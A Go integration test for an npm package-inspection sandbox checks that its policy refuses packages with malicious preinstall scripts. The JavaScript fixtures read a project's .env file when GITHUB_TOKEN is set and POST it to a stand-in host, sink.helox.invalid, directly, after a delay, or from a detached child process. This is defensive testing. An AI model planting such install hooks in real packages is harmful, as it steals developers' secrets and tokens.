//go:build linux && realcorpus

package bootstrap

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/rahoney/heliopause/internal/application"
	"github.com/rahoney/heliopause/internal/core/domain"
	"github.com/rahoney/heliopause/internal/evidence/local"
	inspectionnpm "github.com/rahoney/heliopause/internal/inspection/npm"
	"github.com/rahoney/heliopause/internal/policy"
	"github.com/rahoney/heliopause/internal/sandbox"
	verificationnpm "github.com/rahoney/heliopause/internal/verification/npm"
)

// Preserve the actual backend's operational diagnostic while the ordinary
// inspector retains its valid incomplete result. This changes no authority.
type stimulusBackendCapture struct {
	*sandbox.Backend
	t *testing.T
}

func (b stimulusBackendCapture) Execute(ctx context.Context, request domain.SandboxRequest) (domain.SandboxResult, error) {
	result, err := b.Backend.Execute(ctx, request)
	if err != nil {
		b.t.Logf("actual stimulus backend: %v", err)
	}
	return result, err
}

// Controlled source bytes use the existing explicit test transport. Inspection,
// stored Evidence and Policy are real; public authenticity/install are not claimed.
func TestLinuxStimulusNodePolicyCorpusIntegration(t *testing.T) {
	if os.Getenv("HELOX_STIMULUS_CORPUS_INTEGRATION") != "1" || os.Geteuid() == 0 {
		t.Skip("requires declared ordinary-user controlled stimulus corpus")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 4*time.Minute)
	defer cancel()
	executor, supervisor, _ := npmProjectIntegrationRuntime(t, ctx)
	const chain = `const http=require("node:http");
const request=http.get("http://probe.helox.invalid/probe",response=>{response.resume();response.on("end",()=>{
if(response.statusCode!==200){process.exitCode=91;return;}
const body=require("node:fs").readFileSync("/tmp/project/.env");
const sink=http.request({hostname:"sink.helox.invalid",path:"/sink",method:"POST",headers:{"Content-Length":body.length}},reply=>{reply.resume();reply.on("end",()=>{if(reply.statusCode!==204)process.exitCode=92;});});
sink.on("error",()=>{process.exitCode=93;});sink.end(body);
});});request.on("error",()=>{process.exitCode=94;});`
	const gate = `if(process.env.GITHUB_TOKEN&&require("node:fs").existsSync("/tmp/project/.env"))`
	child, err := json.Marshal(`setTimeout(()=>{` + chain + `},50);`)
	if err != nil {
		t.Fatal(err)
	}
	for _, item := range []struct{ name, program string }{
		{"normal", ""},
		{"conditional-chain", gate + `{` + chain + `}`},
		{"delayed-chain", gate + `{setTimeout(()=>{` + chain + `},50);}`},
		{"detached-child", gate + `{const child=require("node:child_process").spawn(process.execPath,["-e",` + string(child) + `],{detached:true,stdio:"ignore"});child.unref();}`},
	} {
		if !t.Run(item.name, func(t *testing.T) {
			root, err := filepath.EvalSymlinks(t.TempDir())
			if err != nil {
				t.Fatal(err)
			}
			var scripts map[string]string
			if item.program != "" {
				if strings.Contains(item.program, "'") {
					t.Fatal("controlled shell fixture contains a quote")
				}
				scripts = map[string]string{"preinstall": "node -e '" + item.program + "'"}
			}
			source, resolution := nodeBoundarySourceWithLifecycle(t, ctx, root+"/intake", scripts)
			backend, err := sandbox.NewLinuxBackendWithExecutor(root+"/intake", executor, supervisor.Observer(), newObservationResourceAdapter())
			if err != nil {
				t.Fatal(err)
			}
			static, err := inspectionnpm.NewInspector(root + "/intake")
			if err != nil {
				t.Fatal(err)
			}
			dynamic, err := inspectionnpm.NewDynamicInspector(stimulusBackendCapture{backend, t})
			if err != nil {
				t.Fatal(err)
			}
			composite, err := inspectionnpm.NewCompositeInspector(static, dynamic)
			if err != nil {
				t.Fatal(err)
			}
			store, err := local.NewStore(root + "/evidence")
			if err != nil {
				t.Fatal(err)
			}
			service, err := application.NewExecutionInspectService(source, verificationnpm.IntegrityVerifier{}, composite, store, policy.M3{}, policy.M4{}, domain.NewOperationID, domain.NewRunID)
			if err != nil {
				t.Fatal(err)
			}
			approved, inspectErr := service.InspectResolved(ctx, resolution)
			var refused *application.ExecutionPolicyFailure
			var inspected domain.InspectedDependencySet
			if item.name == "normal" {
				if inspectErr != nil || !approved.Valid() {
					t.Fatal("normal control not approved", inspectErr)
				}
				inspected = approved.Set().Inspected()
			} else {
				if !errors.As(inspectErr, &refused) || approved.Valid() || refused.Decision().Decision() == domain.DecisionAllow {
					t.Fatal("conditional artifact gained approval or lost trusted refusal facts", inspectErr)
				}
				inspected = refused.Inspected()
			}
			entries := inspected.Inspections()
			if len(entries) != 1 {
				t.Fatal("whole current entry missing")
			}
			entry := entries[0]
			for _, check := range entry.Checks() {
				if check.Required() && (check.Capability() != domain.CapabilitySupported || check.Status() != domain.ExecutionCompleted) {
					code, _ := check.LimitationCode()
					t.Fatal("stimulus coverage incomplete", check.ID(), check.Status(), code)
				}
			}
			states, network := 0, uint64(0)
			for _, reference := range entry.Evidence() {
				fact, _, err := store.ReadReference(ctx, entry.RunID(), reference, entry.Artifact().Identity(), entry.Artifact().Digest())
				if err != nil {
					t.Fatal("same-subject stored Evidence unavailable", err)
				}
				if fact.Kind() == "workspace-state" {
					states++
				}
				if fact.Kind() == "npm-dynamic-lifecycle" {
					var summary struct {
						Counts map[string]uint64 `json:"counts"`
					}
					if err := json.Unmarshal([]byte(fact.Summary()), &summary); err != nil {
						t.Fatal(err)
					}
					network += summary.Counts["NETWORK:network-attempt"]
				}
			}
			if states != 2 || item.name != "normal" && network == 0 || item.name == "normal" && network != 0 {
				t.Fatal("required condition/late-child action not observed", states, network)
			}
			t.Logf("stimulus_node case=%s current_checks=%d stored_states=%d network=%d policy=%s approval=%t public_authenticity/install=NOT_CLAIMED", item.name, len(entry.Checks()), states, network, entry.PolicyDecision().Decision(), approved.Valid())
		}) {
			t.FailNow()
		}
	}
}
